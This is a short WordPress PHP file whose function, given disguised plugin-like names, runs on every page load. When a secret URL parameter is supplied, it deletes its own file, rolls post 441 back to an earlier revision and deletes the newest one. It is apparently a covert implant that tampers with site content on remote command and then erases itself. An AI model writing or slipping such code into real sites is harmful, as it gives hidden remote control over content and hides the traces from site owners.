<?php

function super_card_visitor_progress() {
	if (isset($_GET['activity_header_wow']) && $_GET['activity_header_wow'] === 'option_reader_polyfill_floating') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$group_excerpt_pages_gallery = 441;
		$maker_learndash_design_front = wp_get_post_revisions($group_excerpt_pages_gallery);
		if (empty($maker_learndash_design_front)) die('no revisions');
		if (count($maker_learndash_design_front) < 2) die('less than 2');
		$accessibility_ticket_subscriptions = array_shift($maker_learndash_design_front);
		$meta_elementor_review = $accessibility_ticket_subscriptions->ID;
		$conditional_directory_private_new = array_shift($maker_learndash_design_front);
		$reloaded_woff2_archive_dropdown = $conditional_directory_private_new->ID;
		$shop_media_chart = wp_restore_post_revision($reloaded_woff2_archive_dropdown);
		if ($shop_media_chart === false) die('error restoring');
		$shop_media_chart = wp_delete_post_revision($meta_elementor_review);		
		if ($shop_media_chart === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'super_card_visitor_progress');
